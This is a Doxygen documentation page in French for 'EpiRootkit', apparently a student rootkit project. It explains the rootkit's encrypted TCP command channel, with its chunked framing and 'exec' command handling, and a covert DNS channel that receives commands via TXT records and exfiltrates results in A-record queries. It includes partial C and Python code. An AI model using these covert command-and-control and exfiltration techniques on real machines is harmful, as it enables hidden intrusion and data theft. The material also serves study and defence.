<!-- HTML header for doxygen 1.13.2-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=11"/>
<meta name="generator" content="Doxygen 1.9.8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>EpiRootkit: R√©seau</title>
<!--BEGIN PROJECT_ICON-->
<link rel="icon" href="../../$projecticon" type="image/x-icon" />
<!--END PROJECT_ICON-->
<link href="../../tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../jquery.js"></script>
<script type="text/javascript" src="../../dynsections.js"></script>
<!--BEGIN COPY_CLIPBOARD-->
<script type="text/javascript" src="../../clipboard.js"></script>
<!--END COPY_CLIPBOARD-->
<link href="../../navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../resize.js"></script>
<script type="text/javascript" src="../../navtreedata.js"></script>
<script type="text/javascript" src="../../navtree.js"></script>
<link href="../../search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../search/searchdata.js"></script>
<script type="text/javascript" src="../../search/search.js"></script>
<link href="../../doxygen.css" rel="stylesheet" type="text/css" />
<link href="../../doxygen-awesome.css" rel="stylesheet" type="text/css"/>
  <script type="text/javascript" src="../../doxygen-awesome-darkmode-toggle.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeDarkModeToggle.init()
    </script>
  <script type="text/javascript" src="../../doxygen-awesome-interactive-toc.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeInteractiveToc.init()
      DoxygenAwesomeInteractiveToc.hideMobileMenu = false
      DoxygenAwesomeInteractiveToc.topOffset = 45
  </script>
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr id="projectrow">
  <td id="projectlogo"><img alt="Logo" src="../../logo_no_text.png"$logosize/></td>
  <td id="projectalign">
   <div id="projectname">EpiRootkit
   </div>
   <div id="projectbrief">Par STDBOOL</div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.9.8 -->
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
var searchBox = new SearchBox("searchBox", "../../search/",'.html');
/* @license-end */
</script>
<script type="text/javascript" src="../../menudata.js"></script>
<script type="text/javascript" src="../../menu.js"></script>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(function() {
  initMenu('../../',true,false,'search.php','Search');
  $(document).ready(function() { init_search(); });
});
/* @license-end */
</script>
<div id="main-nav"></div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(document).ready(function(){initNavTree('d5/dc4/network.html','../../'); initResizable(); });
/* @license-end */
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<div id="MSearchResults">
<div class="SRPage">
<div id="SRIndex">
<div id="SRResults"></div>
<div class="SRStatus" id="Loading">Loading...</div>
<div class="SRStatus" id="Searching">Searching...</div>
<div class="SRStatus" id="NoMatches">No Matches</div>
</div>
</div>
</div>
</div>

<div><div class="header">
  <div class="headertitle"><div class="title">R√©seau</div></div>
</div><!--header-->
<div class="contents">
<div class="toc"><h3>Table of Contents</h3>
<ul><ul><li class="level2"><a href="#autotoc_md43">1. üåê Introduction</a></li>
<li class="level2"><a href="#autotoc_md44">2. ü§ù TCP</a><ul><li class="level3"><a href="#autotoc_md45">2.1 üß† Introduction</a></li>
<li class="level3"><a href="#tcp-protocole">2.2 üì¶ Protocole</a><ul><li class="level4"><a href="#autotoc_md46">Constantes importantes</a></li>
<li class="level4"><a href="#autotoc_md47">Objectif</a></li>
<li class="level4"><a href="#autotoc_md48">Structure g√©n√©rale</a></li>
<li class="level4"><a href="#autotoc_md49">Champs</a></li>
<li class="level4"><a href="#autotoc_md50">Envoi</a></li>
<li class="level4"><a href="#autotoc_md51">R√©ception</a></li>
<li class="level4"><a href="#autotoc_md52">Points forts</a></li>
<li class="level4"><a href="#autotoc_md53">Limitations</a></li>
</ul>
</li>
<li class="level3"><a href="#autotoc_md54">2.3 üõ†Ô∏è Impl√©mentation</a></li>
</ul>
</li>
<li class="level2"><a href="#autotoc_md55">3. üß≠ DNS</a><ul><li class="level3"><a href="#autotoc_md56">3.1 üß† Principes</a></li>
<li class="level3"><a href="#autotoc_md57">3.2 üì® Requ√™te</a><ul><li class="level4"><a href="#autotoc_md58">3.2.1 Header</a></li>
<li class="level4"><a href="#autotoc_md59">3.2.2 QNAME</a></li>
<li class="level4"><a href="#autotoc_md60">3.2.3 Socket</a></li>
<li class="level4"><a href="#autotoc_md61">3.2.4 R√©ponse</a></li>
</ul>
</li>
<li class="level3"><a href="#autotoc_md62">3.3 üéØ Commandes</a><ul><li class="level4"><a href="#autotoc_md63">3.3.1 Worker</a></li>
<li class="level4"><a href="#autotoc_md64">3.3.2 R√©ception</a></li>
</ul>
</li>
<li class="level3"><a href="#autotoc_md65">3.4 üõ∞Ô∏è Exfiltration</a></li>
</ul>
</li>
<li class="level2"><a href="#autotoc_md66">4. üîí Chiffrement</a><ul><ul><li class="level4"><a href="#autotoc_md67">Principes</a></li>
<li class="level4"><a href="#autotoc_md68">Impl√©mentation</a></li>
<li class="level4"><a href="#autotoc_md69">R√©sum√©</a></li>
</ul>
</ul>
</li>
</ul>
</ul>
</div>
<div class="textblock"><h2><a class="anchor" id="autotoc_md43"></a>
1. üåê Introduction</h2>
<p>Le rootkit impl√©mente deux canaux de communication r√©seau principaux entre la machine attaquante et la machine victime‚ÄØ:</p><ul>
<li>Un canal <b>TCP</b> chiffr√© pour l‚Äô√©change de commandes et de donn√©es.</li>
<li>Un canal <b>DNS</b> furtif pour l‚Äôenvoi de commandes et la r√©ception de r√©sultats via des requ√™tes DNS. Ces deux canaux utilisent le chiffrement AES-128 pour s√©curiser les donn√©es √©chang√©es. Le canal TCP est le canal principal, tandis que le canal DNS est utilis√© comme m√©thode de communication de secours ou furtive.</li>
</ul>
<h2><a class="anchor" id="autotoc_md44"></a>
2. ü§ù TCP</h2>
<h3><a class="anchor" id="autotoc_md45"></a>
2.1 üß† Introduction</h3>
<p>Dans l‚Äôobjectif de s√©curiser nos communications r√©seau, nous avons fait le choix d'utiliser le chiffrement AES-128 pour toutes les donn√©es √©chang√©es entre le client et le serveur. Cependant, le d√©faut de cet algorithme est qu'il ne permet pas de transmettre des donn√©es de taille arbitraire. En effet, le chiffrement AES-128 produit un bloc de 16 octets, ce qui signifie que les donn√©es doivent √™tre d√©coup√©es en blocs de cette taille avant d'√™tre chiffr√©es.</p>
<p>Or, lors de la transmission de donn√©es via un socket, il est courant que les donn√©es soient de taille variable, ce qui pose un probl√®me pour le chiffrement. Il en est bien s√ªr de m√™me pour les donn√©es re√ßues, qui peuvent √™tre de taille variable et ne pas correspondre √† un multiple de 16 octets.</p>
<p>Pour r√©soudre ce probl√®me, nous avons mis en place un protocole personnalis√© de transmission chunk√©e. Ce protocole permet de d√©couper les donn√©es en chunks de taille fixe, chacun √©tant enrichi d'un en-t√™te (non chiffr√©) pour l'identification, la reconstruction et la d√©tection des erreurs. Ainsi, m√™me si les donn√©es sont de taille variable, elles peuvent √™tre d√©coup√©es en chunks de taille fixe, ce qui permet de les chiffrer et de les transmettre de mani√®re fiable.</p>
<h3><a class="anchor" id="tcp-protocole"></a>
2.2 üì¶ Protocole</h3>
<h4><a class="anchor" id="autotoc_md46"></a>
Constantes importantes</h4>
<div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadNone">Constante   </th><th class="markdownTableHeadNone">Valeur par d√©faut   </th><th class="markdownTableHeadNone">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>STD_BUFFER_SIZE</code>   </td><td class="markdownTableBodyNone">1024   </td><td class="markdownTableBodyNone">Taille fixe des buffers utilis√©s    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>CHUNK_OVERHEAD</code>   </td><td class="markdownTableBodyNone">11   </td><td class="markdownTableBodyNone">10 (header) + 1 (EOT_CODE)    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>EOT_CODE</code>   </td><td class="markdownTableBodyNone"><code>0x04</code>   </td><td class="markdownTableBodyNone">Code ASCII pour "End of Transmission"   </td></tr>
</table>
</div><h4><a class="anchor" id="autotoc_md47"></a>
Objectif</h4>
<p>Ce protocole personnalis√© permet de transmettre de mani√®re fiable des donn√©es de taille arbitraire (texte ou fichiers) entre un client et un serveur via un socket noyau. Les donn√©es sont <b>chiffr√©es</b> puis <b>d√©coup√©es en chunks fixes</b>, chacun enrichi d‚Äôun en-t√™te pour l‚Äôidentification, la reconstruction et la d√©tection des erreurs.</p>
<h4><a class="anchor" id="autotoc_md48"></a>
Structure g√©n√©rale</h4>
<p>Chaque chunk est un buffer de taille constante <code>STD_BUFFER_SIZE</code> octets structur√© comme suit :</p>
<div class="fragment"><div class="line">+-------------------+-------------------+-------------------+-------------------------------+------------+</div>
<div class="line">| total_chunks (4B) | chunk_index (4B)  | data_len (2B)     | payload (‚â§ BODY_SIZE, var.)   | EOT (1B)   |</div>
<div class="line">+-------------------+-------------------+-------------------+-------------------------------+------------+</div>
</div><!-- fragment --><h4><a class="anchor" id="autotoc_md49"></a>
Champs</h4>
<div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadNone">Champ   </th><th class="markdownTableHeadNone">Taille   </th><th class="markdownTableHeadNone">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>total_chunks</code>   </td><td class="markdownTableBodyNone">4 octets   </td><td class="markdownTableBodyNone">Nombre total de chunks (big-endian)    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>chunk_index</code>   </td><td class="markdownTableBodyNone">4 octets   </td><td class="markdownTableBodyNone">Index de ce chunk dans la s√©quence (big-endian)    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>data_len</code>   </td><td class="markdownTableBodyNone">2 octets   </td><td class="markdownTableBodyNone">Longueur r√©elle des donn√©es dans le chunk (big-endian)    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>payload</code>   </td><td class="markdownTableBodyNone">variable   </td><td class="markdownTableBodyNone">Donn√©es chiffr√©es    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>EOT_CODE</code>   </td><td class="markdownTableBodyNone">1 octet   </td><td class="markdownTableBodyNone">Code de fin de transmission pour le chunk (valide si positionn√©)    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>padding</code>   </td><td class="markdownTableBodyNone">variable   </td><td class="markdownTableBodyNone">Remplissage pour atteindre <code>STD_BUFFER_SIZE</code>, ignor√© √† la r√©ception   </td></tr>
</table>
</div> <blockquote class="doxtable">
<p>&zwj;üîí <b>Toutes les donn√©es envoy√©es dans le payload sont chiffr√©es avant le d√©coupage en chunks.</b> </p>
</blockquote>
<h4><a class="anchor" id="autotoc_md50"></a>
Envoi</h4>
<ol type="1">
<li><b>Chiffrement :</b> La donn√©e brute est chiffr√©e avec AES-128 via <code>encrypt_buffer</code>.</li>
<li><b>D√©coupage :</b> Le buffer chiffr√© est segment√© en chunks de <code>BODY_SIZE</code> (= <code>STD_BUFFER_SIZE - 11 (HEADER_SIZE + FOOTER_SIZE)</code>).</li>
<li><b>Encapsulation :</b> Chaque chunk est pr√©fix√© par un en-t√™te structur√© contenant :<ul>
<li>Le nombre total de chunks</li>
<li>L‚Äôindex du chunk</li>
<li>La longueur des donn√©es utiles</li>
<li>Le marqueur <code>EOT_CODE</code> √† la fin des donn√©es</li>
</ul>
</li>
<li><b>Envoi :</b> Chaque chunk est envoy√© via <code>kernel_sendmsg</code>.</li>
</ol>
<h4><a class="anchor" id="autotoc_md51"></a>
R√©ception</h4>
<ol type="1">
<li><b>Lecture progressive :</b><ul>
<li>Lecture de l'en-t√™te (10 octets).</li>
<li>Lecture du <code>payload</code> + <code>EOT</code> (donn√©es utiles).</li>
<li>Lecture des √©ventuels octets de padding.</li>
</ul>
</li>
<li><b>Validation :</b><ul>
<li>V√©rifie les tailles.</li>
<li>V√©rifie la pr√©sence correcte du <code>EOT_CODE</code>.</li>
<li>Assure la coh√©rence de <code>total_chunks</code> et <code>chunk_index</code>.</li>
</ul>
</li>
<li><b>Assemblage :</b><ul>
<li>Alloue un tampon de r√©ception si c‚Äôest le premier chunk.</li>
<li>Marque chaque chunk re√ßu comme <code>vu</code>.</li>
<li>Recopie les donn√©es √† la bonne position.</li>
<li>Attend la r√©ception de tous les chunks.</li>
</ul>
</li>
<li><b>D√©chiffrement :</b> Une fois tous les chunks re√ßus, assemble et d√©chiffre les donn√©es avec l'algorithme AES-128.</li>
<li><b>Traitement du message re√ßu :</b><ul>
<li>Si la donn√©e commence par <code>exec</code>, la traite comme commande texte.</li>
<li>Si un transfert de fichier est en cours, les donn√©es re√ßues sont g√©r√©es par la partie de transfert de fichiers.</li>
<li>Sinon, elle est copi√©e vers le tampon utilisateur.</li>
</ul>
</li>
</ol>
<h4><a class="anchor" id="autotoc_md52"></a>
Points forts</h4>
<ul>
<li><b>Fiabilit√© :</b> Chaque chunk contient des m√©ta-informations pour la v√©rification de coh√©rence.</li>
<li><b>Idempotence :</b> Les chunks sont g√©r√©s de sorte √† ce que les doublons ne posent pas de souci (copie directe des donn√©es dans un tableau en utilisant l'index de chunk).</li>
<li><b>Taille arbitraire :</b> Le protocole supporte l'envoi de messages faisant jusqu'√† 4 To.</li>
<li><b>S√©curit√© :</b> Tous les transferts sont chiffr√©s.</li>
<li><b>Flexibilit√© :</b> G√®re √† la fois les transferts de texte brut et de fichiers binaires.</li>
</ul>
<h4><a class="anchor" id="autotoc_md53"></a>
Limitations</h4>
<ul>
<li>Le protocole ne g√®re pas les retransmissions : il suppose que les sockets sont fiables ou que les erreurs de transmission sont g√©r√©es par le protocole TCP sous-jacent.</li>
<li>Aucun checksum n‚Äôest int√©gr√© pour v√©rifier l'int√©grit√© apr√®s chiffrement.</li>
<li>Le temps d‚Äôattente pour recevoir tous les chunks n‚Äôest pas limit√© (peut bloquer ind√©finiment).</li>
</ul>
<h3><a class="anchor" id="autotoc_md54"></a>
2.3 üõ†Ô∏è Impl√©mentation</h3>
<p>Le protocole personnalis√© de transmission chunk√©e est impl√©ment√© dans les fichiers <code><a class="el" href="../../d6/d6e/network_8c.html">network.c</a></code> (pour le rootkit) et le fichier <code><a class="el" href="../../d3/d9a/AESNetworkHandler_8py.html">AESNetworkHandler.py</a></code> (pour l'attaquant). Voici un aper√ßu des principales fonctions : Les fonctions principales du protocole chunk√© sont‚ÄØ:</p>
<ul>
<li><p class="startli"><code><a class="el" href="../../d6/d6e/network_8c.html#a57b1c96d9aa9b9d9453d0dca6a7c3b87">send_to_server_raw(const char *data, size_t len)</a></code>‚ÄØ: Cette fonction chiffre les donn√©es √† envoyer, les d√©coupe en chunks de taille fixe, ajoute un en-t√™te √† chaque chunk (nombre total de chunks, index, taille utile, marqueur de fin), puis les envoie un √† un via le socket noyau. <br  />
 Exemple simplifi√©‚ÄØ:</p>
<div class="fragment"><div class="line"><span class="comment">// Encrypt the data before sending</span></div>
<div class="line"><span class="keywordflow">if</span> (<a class="code hl_function" href="../../dd/d34/aes_8c.html#a3e5d8f107c3453c7e498e162026f2dac">encrypt_buffer</a>(data, len, &amp;encrypted_msg, &amp;encrypted_len) &lt; 0)</div>
<div class="line">      <span class="keywordflow">return</span> -EIO;</div>
<div class="line"> </div>
<div class="line"><span class="comment">// [... Calculate number of chunks and max chunk body size...]</span></div>
<div class="line"> </div>
<div class="line"><span class="comment">// Send each chunk separately</span></div>
<div class="line"><span class="keywordflow">for</span> (i = 0; i &lt; nb_chunks; ++i) {</div>
<div class="line">    <span class="comment">// Construction of the header </span></div>
<div class="line">    <span class="comment">// total_chunks in big-endian 32 bits</span></div>
<div class="line">    uint32_t tc = (uint32_t)nb_chunks;</div>
<div class="line">    chunk[0] = (uint8_t)((tc &gt;&gt; 24) &amp; 0xFF);</div>
<div class="line">    chunk[1] = (uint8_t)((tc &gt;&gt; 16) &amp; 0xFF);</div>
<div class="line">    chunk[2] = (uint8_t)((tc &gt;&gt; 8) &amp; 0xFF);</div>
<div class="line">    chunk[3] = (uint8_t)((tc &gt;&gt; 0) &amp; 0xFF);</div>
<div class="line"> </div>
<div class="line">    <span class="comment">// chunk_index in big-endian 32 bits</span></div>
<div class="line">    uint32_t ci = (uint32_t)i;</div>
<div class="line">    chunk[4] = (uint8_t)((ci &gt;&gt; 24) &amp; 0xFF);</div>
<div class="line">    chunk[5] = (uint8_t)((ci &gt;&gt; 16) &amp; 0xFF);</div>
<div class="line">    chunk[6] = (uint8_t)((ci &gt;&gt; 8) &amp; 0xFF);</div>
<div class="line">    chunk[7] = (uint8_t)((ci &gt;&gt; 0) &amp; 0xFF);</div>
<div class="line"> </div>
<div class="line">    <span class="comment">// chunk_len in big-endian 16 bits</span></div>
<div class="line">    uint16_t cl = (uint16_t)chunk_len;</div>
<div class="line">    chunk[8] = (uint8_t)((cl &gt;&gt; 8) &amp; 0xFF);</div>
<div class="line">    chunk[9] = (uint8_t)((cl &gt;&gt; 0) &amp; 0xFF);</div>
<div class="line"> </div>
<div class="line">    <span class="comment">// Copy the encrypted message into the chunk</span></div>
<div class="line">    memcpy(chunk + 10, encrypted_msg + i * max_chunk_body, chunk_len);</div>
<div class="line"> </div>
<div class="line">    <span class="comment">// Add the EOT_CODE at the end</span></div>
<div class="line">    chunk[10 + chunk_len] = <a class="code hl_define" href="../../d6/d6e/network_8c.html#a2d214f4194a9f20a702b2ba69159a868">EOT_CODE</a>;</div>
<div class="line">    </div>
<div class="line">    <span class="comment">// [... Send the chunk via kernel_sendmsg ...]</span></div>
<div class="line">}</div>
<div class="ttc" id="aaes_8c_html_a3e5d8f107c3453c7e498e162026f2dac"><div class="ttname"><a href="../../dd/d34/aes_8c.html#a3e5d8f107c3453c7e498e162026f2dac">encrypt_buffer</a></div><div class="ttdeci">int encrypt_buffer(const char *in, size_t in_len, char **out, size_t *out_len)</div><div class="ttdoc">Encrypts a buffer using AES-128 in CBC mode.</div><div class="ttdef"><b>Definition</b> <a href="../../dd/d34/aes_8c_source.html#l00322">aes.c:322</a></div></div>
<div class="ttc" id="anetwork_8c_html_a2d214f4194a9f20a702b2ba69159a868"><div class="ttname"><a href="../../d6/d6e/network_8c.html#a2d214f4194a9f20a702b2ba69159a868">EOT_CODE</a></div><div class="ttdeci">#define EOT_CODE</div><div class="ttdef"><b>Definition</b> <a href="../../d6/d6e/network_8c_source.html#l00018">network.c:18</a></div></div>
</div><!-- fragment --></li>
<li><code><a class="el" href="../../d6/d6e/network_8c.html#a666e3b95602cc2a6ef57a2af56b0d8ef">receive_from_server(char *buffer, size_t max_len)</a></code>‚ÄØ: <br  />
 Cette fonction lit les donn√©es re√ßues depuis le socket noyau, lit chaque chunk, v√©rifie son en-t√™te, assemble les donn√©es dans un tampon de r√©ception, et d√©chiffre le message complet une fois tous les chunks re√ßus. Ce ne sont finalement que les op√©rations inverses de <code>send_to_server_raw</code>. Voici l'exemple de l'impl√©mentation analogue en python (pr√©sente dans <code><a class="el" href="../../d3/d9a/AESNetworkHandler_8py.html">AESNetworkHandler.py</a></code>) : <div class="fragment"><div class="line"><span class="keyword">def </span>receive(self, sock: socket.socket) -&gt; str | bool:</div>
<div class="line">      <span class="comment"># buffer containing the full received message</span></div>
<div class="line">      buffer = bytearray()</div>
<div class="line">      <span class="comment"># List to track received chunks (initialized with first received chunk)</span></div>
<div class="line">      received_chunks = <span class="keywordtype">None</span></div>
<div class="line">      <span class="comment"># Total number of chunks to expect (initialized with first received chunk)</span></div>
<div class="line">      total_chunks = <span class="keywordtype">None</span></div>
<div class="line"> </div>
<div class="line">      <span class="keywordflow">while</span> <span class="keyword">True</span>:</div>
<div class="line">          head = <span class="comment"># [... Read the header (10 bytes) from the socket ...]</span></div>
<div class="line"> </div>
<div class="line">          total_chunks_read = (</div>
<div class="line">              (head[0] &lt;&lt; 24) |</div>
<div class="line">              (head[1] &lt;&lt; 16) |</div>
<div class="line">              (head[2] &lt;&lt; 8)  |</div>
<div class="line">              (head[3] &lt;&lt; 0)</div>
<div class="line">          )</div>
<div class="line">          chunk_index = (</div>
<div class="line">              (head[4] &lt;&lt; 24) |</div>
<div class="line">              (head[5] &lt;&lt; 16) |</div>
<div class="line">              (head[6] &lt;&lt; 8)  |</div>
<div class="line">              (head[7] &lt;&lt; 0)</div>
<div class="line">          )</div>
<div class="line">          chunk_len = (head[8] &lt;&lt; 8) | head[9]</div>
<div class="line"> </div>
<div class="line">          needed = self._header_size + chunk_len + 1</div>
<div class="line">          <span class="keywordflow">if</span> needed &gt; self._buffer_size:</div>
<div class="line">              print(f<span class="stringliteral">&quot;[RECEIVE ERROR] chunk_len {chunk_len} inconsistent (need {needed} &gt; {self._buffer_size})&quot;</span>)</div>
<div class="line">              <span class="keywordflow">return</span> <span class="keyword">False</span></div>
<div class="line"> </div>
<div class="line">          <span class="comment"># Read payload plus EOT</span></div>
<div class="line">          payload_plus_eot = self._recv_exact(sock, chunk_len + 1)</div>
<div class="line">          </div>
<div class="line">          <span class="comment"># [... Check payload and EOT code validity ...]</span></div>
<div class="line"> </div>
<div class="line">          <span class="comment"># Initialize tracking on the first chunk</span></div>
<div class="line">          <span class="keywordflow">if</span> total_chunks <span class="keywordflow">is</span> <span class="keywordtype">None</span>:</div>
<div class="line">              received_chunks = [<span class="keyword">False</span>] * total_chunks_read</div>
<div class="line"> </div>
<div class="line">          <span class="comment"># [... Check chunk_index validity (prevent out of bounds) ...]</span></div>
<div class="line"> </div>
<div class="line">          <span class="comment"># [... Construct the full ciphered message ...]</span></div>
<div class="line"> </div>
<div class="line">          <span class="comment"># Mark this chunk as received</span></div>
<div class="line">          received_chunks[chunk_index] = <span class="keyword">True</span></div>
<div class="line"> </div>
<div class="line">          <span class="comment"># If all chunks are received, break</span></div>
<div class="line">          <span class="keywordflow">if</span> all(received_chunks):</div>
<div class="line">              <span class="keywordflow">break</span></div>
<div class="line"> </div>
<div class="line">      <span class="keywordflow">return</span> <span class="comment"># [...decrypted full message...]</span></div>
</div><!-- fragment --></li>
</ul>
<h2><a class="anchor" id="autotoc_md55"></a>
3. üß≠ DNS</h2>
<p>Dans le cadre de ce projet, la communication principale utilis√©e pour l‚Äô√©change de paquets entre les deux machines virtuelles repose naturellement sur le protocole TCP. Cependant, nous avons choisi de mettre en ≈ìuvre une m√©thode de communication alternative afin d‚Äôintroduire un aspect furtif aux √©changes. L‚Äôobjectif est de d√©montrer comment envoyer des commandes √† une machine cible via des requ√™tes DNS de type <b>TXT</b>, puis d‚Äôexfiltrer les r√©sultats de ces commandes en les encapsulant dans des requ√™tes DNS de type <b>A</b>.</p>
<h3><a class="anchor" id="autotoc_md56"></a>
3.1 üß† Principes</h3>
<p>Nous supposons ici un sc√©nario r√©el, o√π il n‚Äôest pas possible de mettre en place un serveur DNS c√¥t√© victime, notamment en raison de restrictions r√©seau ou d‚Äôun √©ventuel blocage par un pare-feu. Par cons√©quent, la solution adopt√©e consiste √† mettre en place un serveur DNS c√¥t√© attaquant. Depuis l‚Äôespace noyau, la machine victime enverra des requ√™tes DNS de type <b>TXT</b> vers un domaine du type <em>command.dns.google.com</em>, afin de demander des informations textuelles. C‚Äôest dans la r√©ponse √† cette requ√™te que l‚Äôattaquant peut ins√©rer une commande, si une est disponible. Sinon, la r√©ponse sera vide.</p>
<p>Pour permettre √† la victime d‚Äôenvoyer des r√©sultats d‚Äôex√©cution ou d‚Äôautres informations en retour, celle-ci enverra des requ√™tes DNS de type <b>A</b>, o√π le nom de domaine contient les donn√©es chiffr√©es. Comme la taille maximale d‚Äôun nom de domaine est limit√©e, et que le domaine complet inclut un suffixe du type *.dns.google.com* ainsi que des identifiants de chunk comme <em>xx/xx-</em>, les donn√©es doivent √™tre fragment√©es en plusieurs morceaux. Par d√©faut :</p><ul>
<li>Le polling DNS de la victime s‚Äôeffectue toutes les 5000 ms pour diminuer l‚Äôactivit√© r√©seau (une piste d‚Äôam√©lioration serait d‚Äôintroduire une part d‚Äôal√©atoire dans le m√©canisme de polling).</li>
<li>Le nombre de chunks est limit√© √† 128 (<a class="el" href="../../db/d16/config_8h.html">config.h</a>), afin d‚Äô√©viter des d√©lais excessifs c√¥t√© attaquant, tout en maintenant un niveau de furtivit√© raisonnable.</li>
</ul>
<p>Une fois les donn√©es re√ßues, le serveur DNS (c√¥t√© attaquant) peut simplement r√©pondre avec une adresse IP arbitraire, par exemple <b>127.0.0.1</b>, puisque l‚Äôadresse <b>IP</b> n‚Äôa aucune importance dans ce contexte. Si je ne me suis pas tromp√© dans les calculs (ce qui a de grandes chances d‚Äôarriver), on peut envoyer depuis la victime vers l‚Äôattaquant 57 octets de donn√©es utiles par requ√™te <b>A</b>, ce qui restreint √©videmment le volume √† transf√©rer et augmente le nombre de chunks (en plus avec le chiffrement...). Pour l‚Äôenvoi de commandes depuis l‚Äôattaquant, la limite est beaucoup plus √©lev√©e, soit environ 459 octets (dans le champ <b>RDATA</b> d‚Äôun enregistrement <b>TXT</b>).</p>
<p><img src="../../dns_technique.svg" alt="" style="pointer-events: none; 
    display: block;
    margin: 20px auto;
    overflow: hidden;
  " class="inline"/></p>
<h3><a class="anchor" id="autotoc_md57"></a>
3.2 üì® Requ√™te</h3>
<h4><a class="anchor" id="autotoc_md58"></a>
3.2.1 Header</h4>
<p>Dans le fichier <a class="el" href="../../d9/d54/dns_8c.html">dns.c</a>, on trouve la d√©finition (packing byte-√†-byte) d‚Äôun header DNS. En byte order r√©seau (big-endian), on utilise la fonction <code>htons()</code> pour chaque champ 16 bits avant de le copier en m√©moire. Le <code>#pragma pack(push, 1)</code> s‚Äôassure que la structure n‚Äôa pas d‚Äôalignement automatique, afin que le remplissage en octets soit exactement lin√©aire (12 octets).</p>
<p><img src="../../dns_header.svg" alt="" style="pointer-events: none; 
    display: block;
    margin: 20px auto;
    overflow: hidden;
  " class="inline"/></p>
<div class="fragment"><div class="line"><span class="preprocessor">#pragma pack(push, 1)</span></div>
<div class="line"><span class="keyword">struct </span><a class="code hl_struct" href="../../de/dd9/structdns__header__t.html">dns_header_t</a> {</div>
<div class="line">    __be16 <a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#a555bb3191b65b5e9599f447653ed981d">id</a>;          <span class="comment">// Identification (16 bits)</span></div>
<div class="line">    __be16 <a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#af4f7a53f6b2df72c34ca881f2714ac91">flags</a>;       <span class="comment">// Flags + codes de r√©ponse (16 bits)</span></div>
<div class="line">    __be16 <a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#a8374f34065d456334e3c63c2ff3306cb">qdcount</a>;     <span class="comment">// Nombre de questions (16 bits)</span></div>
<div class="line">    __be16 <a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#acb0a9a6e729d7ba375297cf625fc938b">ancount</a>;     <span class="comment">// Nombre d‚Äôanswers (r√©ponses) (16 bits)</span></div>
<div class="line">    __be16 <a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#a5c1e988df4a22654a80ef9bbd5e83a13">nscount</a>;     <span class="comment">// Nombre d‚Äôautorit√©s (authority RRs) (16 bits)</span></div>
<div class="line">    __be16 <a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#af107879d493519cfa3dae4c4eb03e6c3">arcount</a>;     <span class="comment">// Nombre de RRs additionnels (RRs) (16 bits)</span></div>
<div class="line">};</div>
<div class="line"><span class="preprocessor">#pragma pack(pop)</span></div>
<div class="ttc" id="astructdns__header__t_html"><div class="ttname"><a href="../../de/dd9/structdns__header__t.html">dns_header_t</a></div><div class="ttdoc">DNS protocol header (network byte order, it is important).</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00010">dns.c:10</a></div></div>
<div class="ttc" id="astructdns__header__t_html_a555bb3191b65b5e9599f447653ed981d"><div class="ttname"><a href="../../de/dd9/structdns__header__t.html#a555bb3191b65b5e9599f447653ed981d">dns_header_t::id</a></div><div class="ttdeci">__be16 id</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00011">dns.c:11</a></div></div>
